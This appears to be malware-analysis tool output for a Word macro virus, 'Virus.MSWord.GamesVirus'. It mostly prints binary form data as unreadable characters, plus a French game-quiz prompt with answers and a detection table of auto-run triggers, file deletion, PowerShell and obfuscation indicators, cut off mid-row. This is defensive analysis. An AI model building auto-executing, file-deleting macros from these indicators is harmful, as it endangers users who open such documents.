VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
qHQena+��pwqnyQRnyf^UQYS_h�[i\idrH\\]qZ/n
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Uyv�������������ch�쩤�����������巤��n�w�viYRSZ~���弤�wccYQrlach�Zog�wwh/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����uuWqqqqmmyym/ymmooymmm/myZZ���}�aa�aa������}}��������uWWWqWWqWqVVmooqu���tt�t��ttt�tt�tuuuWWWWWVqq���������u�qt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}dr��}Q�epVW�YmqomHQ=Sh�fYcfSQZZVmPULY[ljjym�f�����������wnq�o����켊�����~��峉�i`R_ZYYYv������vcnQO*_YZmY}u�g�`Yd/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����t�qqq3qo/yyZZZ/omo/myZmZZZZp}}ba��a}a�}��}�}}pym��uVWWqWWWWqqqqoooooVWtuWuttttttttuututuuWWqqqVoq������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���q���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�vfv��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��~a`Vjb`QU
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S`c`RiU\f\UmBQmL+QOR\mg�~�f�f���������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������~n��}�fg�hYcica������ikw\caHcr^idBZw
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������uqqqqqVomymymyooyyZmZZZ��j�����a�a����������jymoVVqqqqVVqqqVooomomoooqqWu�uuttMutWuWuWWqqqqVVmo�������t�����q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f������������i`Y\[[RmVUQ]f[ZQQSOKSU[d{d{o�cgf������������ӵ��������������wwf`��vwacraaZjeo����~lnc������������ۤd�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����q�WqWq3Vommmmm/mmyZZZZZjpp�}b�a���ba}���j��jmmoooqVqqqqooooomyyy�oyooqqqWWWuWWuWWqWqWqqqqqVVmZ�u��������t�q��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������^Qci\RQVpKUwnZQYU`\i\R]`aYeZhwjf�������������y��������t�������������vrl_{`hvz�q���onfw������渳����͡�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������uqooPqoo/y/ommmyZZZZj��}�k�����}��jjmZ�Z�ZyyoommmoqoooqomqmmyZZZZZZyoq3WWWWWWWWqqWqqqVVVVmm/y���������t���yW
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y\c�ysj�pkUqz�/^[XYSQQQY`fw_LS_gn[HUQU``afZpfe
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������s�~����f��o����f��e�~�w�}i\`wj���Թq�}rc\RYq^Vuqqm�V~d/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������tooooooommmmmmmyZy�jZp�}�k�}kbb}pjZZmmmmooyomoooymooooomm/mmyyyymyoVmmoVV33WqWqPPq3VVqVVoV//y/myut���q�����t�o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j_pif�f�fpRkpZSch/|+jY[ffnmFNRfngjUNOS\YcZom{don���d�������g�ff�vwv�d��e����f�ww����`w{pk|c�u�����pff[\c\h[acmVyVV^vZ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������ZmmmmymVmVmVVmmZZjjj}}��}��a��jZZmoVVoVVVVooooomooqooommy/ZyyoqVqqqWqqq3qq3PVqqmVVVVm/m//ZZmZZZZZ�����������}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�l\af�frcR]Up{rfYZQQSdcfXQF*LfcRYSY^`YYkfoyYp{��fw�w�f�����f�ff�ff�\cw
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z����������nf�lUR]r��q����vbinwicnk_\VoyoQS��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����͆ymmmyZmmmymom/mZZZZZZa^aY�jZmmooVPVVVqqVqqqqqqWWqqWqoooooVV3qqWWqqV3qqVVqVVmmVmmmZmZZZZZ�jZZjQY�}��tu�ot��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q`c`bwwc\S[rc{wYQZb
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
dhehMQZZf�SUY_H]^T[c^qypdjlffffwccf��ff��fww\ffw�l}������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����f�nYRrY�������tgififffQ`\{b|Z��w`o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����omyy�ZZZZymmmoB/mZZ���Y}jZZZmmmomVVVqq3qqqqqqqqqqq3qVPVoooqoqqqqqqqq3qqVoV/m/ZmmZZZjjjp|p�pp��}a����qq�U�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�LR_R`fc\RiR]]\QKr]HUUZkPUjkcn\[Q_UUH[^Hppa��lvwfwfc[ffffn�fff�ln�iw����������s����wnra^k_b������ovwcnwci]v�gckY\i�n/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����qm�ZZyZZyZmmymymZyyZp��jj�ZZZZZZm/mmoVVVqVqq3qqqqqqqqqqV3qVoooVoooVoqqq33VqVommm/mmmZjZp�}}�}�bY�YYaa_{`b|V__^}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
PpI]X+H]]`�p\\S\`K[\YRU/YZa{fcYPBUB\c[TQjgry�fnY���ffw�fcf�f���wwm~�~���������v�����ifekUj}�����깔lf\wf\{fhwwel{nd�Z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����oyZZyZZyZZZmZmZZymyjYUjZZZZZZZZZmmm/VoVVVVVqq3qqWWqVqoooooomZ/mmmoVmooqVqooymmyZZ�Zp|YYaa�~��kaaa_{{`grk{g{��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
VkS[iqd
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
mYQf\S_aYmcc_YQQ^j`fc\VZS[[cfmYXQf^�vffc�fffcfifffwffff\��ww����������������cw{v�n�ͧo�����n�\ff\HcffXfVf\lq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�qtqoymmymymyZjZZZZZZyZ�Z�jjjZZZZZZZZZmmmy/ooVVVVVqqqqqqqqqoommymmmyymooommomVoVommmZZj��}�bb�~��vg�r{~lhll~�r����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o�]/mQc�`_fQhQaZjbc\LBYmON\fT_mQH\cSUOH\phlylffcv�nffwfccf�f�fc��q���t�������������fw�v^\\b������Ө�hnswi\h{�z~wWrcao
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�uWoomooo//Z�jjZZZj�ZZ�j�ZZZZZZZZZ�ZmZmymooooVqVVqqqWqqqVommmyZmmymoomyymoooomyyyyZjY}b��r�~�vi�ll~ll�l~e��k���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y\_ZwfZ~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZYZw�nwadc`ZQOYS]\cUQY][[KQO[\\pf�o�fffiha}dfc�c����w�����c�z�������������fwfiRSkqo������q�f�wcY\w}elUrl�o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�qommmommyZp�jZZ�yZyZj����ZZZZjZ�ZZZmmmmmymmVmoqqqqqqqVqqo/m/yyyommmZZyyoymmymZy�jZ��}�{ggl�gs��hillhlgl~�}�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
YfIPdfYYs�yd�Z��~wZZ^SY=fn^QY]\SYNUT\c`RfZkZfwf}bbd`v~a}aif�����~~�������������������ja_rz�q�����s~fwffZfdnv�keey
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
tomymmmmmyZ�}��jjZ��yZZZZQZZZj�jjjjjZZmmmmmmmmmVVqVqqqqqPVqqVm/myyym/mmyZmmmmmmmZZZZj}~���v���l�l��llhgg~{�YYU�t
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�cpq�wVpZ�`YSDd�vwaVNHHTccQQHH\qUNHh\cfl[h`wpidwecc{�wcU|}f���a��w�gs~~�������f�����wfnmkgs���qq��o������w�f}fcdi�ldm
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
tommyZZyZ�}�}}��ZyyyZZZZZZZZjZjjjZZZmmyyZmmmmooooqVqqqqVqqqomZmommmo�ZZZy�Z��Z�ZZ���gvn��v�g��lv�hihl~{a}jjjo
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}�fY���SVl�UDYs��d/Y]T\cYS[\R{c\jchfwc
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}��prcrffrhhfffchffz�l��|{dq�������f��f��f�wcf�`��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���os�t~�fl�wa\Hww`lY�ro
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
to�ZZZZZ�|�����a�jZZyZZyZ�jjjQjZjjpjZZZZyymmmZmomoVVoVVVVooVooomymoommZyyZZZ��ZZ�ZZZ��}�l���vvvllh��ilil�~{}��ppZ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�~rno�lBqo�s�nsnwYRT\[`H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S^UU5jMar{Xadidcr��lmQYffffwffw\ffww�hff^cw����������������wnw~nn�������y�W�f
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
fnUfXfflceaeZ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
uyZZZZj�r�l��}��ZZyyyy�ZZjjjZ�jZZZZmmZBmmZmooVooVooymmmy/yooommVmZmmZZZjj�j��Y}}��~lhvih�l��v�ig�ivig}}���j��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ze�n���jm���lnnnfy\\UY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
UjQ^YkbVqeLOde�lkln��wo�Ucfcfcwf\cf\nfgffi�yZr�������w�����wwwcrUgl��o�q����q��z�f_cffff�lrzq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
umZY������sek�}ZZZZyZyZZZ�ZjjZjjjZjZZZmmmmmmmmooVoooo/mmmmmm/mm/mmmZZmZZZjjj�Y}��rglivihvl�l�vvvvddv~b}�jjj
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�py��nsYVkeZUf�rYZjU^UZaUBSSUpmaQ[ckfnlhw�z�wZd�V�cffdf\f�c�fw��fff�ffn����fwwwwf�fwn��fm�q�Ӻ��o��u�lbqfw\\[cvlfrr�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z�Yaa_r�~~rraYjj�ZZZZ�Zjj���jjZ�ZZZmmmmmmmmooooomymZyyyZmmmmyyyyZZZZZ����}ab�~livcviil��ivvv�wn�~raY�||�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j_m�wndHPSmiUwhQVPjjr�baQHTZ_PU^cchcfcfiwY�w�ZnvcjQrwfiw�fwn�f�f�fcfvf�fd���fwwwwfw�nn�lXkuu��������o�e��fwcccffckllq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
WZ}�k~s�rr`~rr�}�jZZZZjjj�jjU}��UjjjjZZmmZmZmmZoVomoyyZyZZZymmmmmmmZZyZZU�j��aaa�k_rg��cdddvih�vvvccf��l{�}�j�Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�la/en�rQSSn�_VZmQ[`S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y[\XQQUa{df�if��f_f�gwi}hfffYUecYf�vffv�f\ff[gcfdf��fffwffwwwnnnnfkk}�t�o�����婹wffwcfwwwvill�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
qY�������~rrrrbaYUQjZ�jjjYY}YY�jjQjjZZZZZmZmmoVmomyZZZZmZmZmZmyZZmZj�UY}a���r{liid�ncdvcvv��wnnnww��g~�a}���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��~ZQ`c`Y/hZjBKmYKNQSk\\HmjaQwf�fhww�ff���Ī��Ъ������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����½ƽ���ز�fwwwcnwf�lv�~t��q�������s�s�fff[[ccf`�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o}k~w�c�lrrr�e_baYUUjj���j���UppjjjjjjZZZZmmmmoomymm/ymmZZZZmmZZZy��j��Y�a�k�rr{glivccnfccc�nnff����w�h{��aaY��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}�����߀QUbZUHZRHYYQ/fcHUQjhXTffffff\fw��tyZ�q��}}�/a�y�������';��QYm�ZYQQ����wwwwwwww��wwf�z�q�����ͦ����������컠�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
yrlvwnv�l~{rrrre}aY}}YY�}}�YY���UUp��Ujpjp�ZZZZmmmmomVmmmmmyj�jjZZZj��p�YY}a�er{rlidc��wffcnwff�������wdlrek�aY�}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}��q����`\d\Hgf\QaO\\Y^ZS\\fcc\ccXccnkv��o��oy��aZ������o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8GpUZ�pYjj�jU���cwcwwww�wffw��f~z���t�t��������������ny
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
yln������lg{kkkkk��^aaaa��aaa}}��YYYYYjjppjpZZZymmy//mmmmZZ�ZZZZZZZYYY}a��kr{ll�vc�wwffc\ddw�������fdl~�b�b}��}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���q����q[RHi\cwncf\5US^H\cf]�fcc\cff_\e���Ű��ŴŢ��諫�ԩ�~��������������fcwwwwwf���f���s����ooqy�������浵�������d�����w�vl~~rrrkkb_�b_brrkkkba}}}}}Y�ppUUUjjjjZZmZmmyyZmZy}����Z�ZZYY}bkkrglvcnwfffffcc���������fvl~k}}}aY���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�De quel jeu est tir� cette image ?O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Daytona USA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Screamer 2E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
